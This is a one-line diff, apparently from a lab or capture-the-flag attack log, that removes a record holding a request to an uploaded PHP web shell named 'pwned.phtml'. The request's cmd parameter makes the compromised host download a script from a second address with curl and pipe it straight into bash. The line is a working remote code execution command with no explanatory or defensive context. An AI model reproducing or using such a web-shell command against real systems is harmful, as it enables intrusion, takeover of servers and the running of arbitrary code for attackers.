@@ -1,1 +1,0 @@
-1|1|http://10.10.9.250/uploads/pwned.phtml?cmd=curl%2010.21.104.203:8000/index.html%20|%20bash 
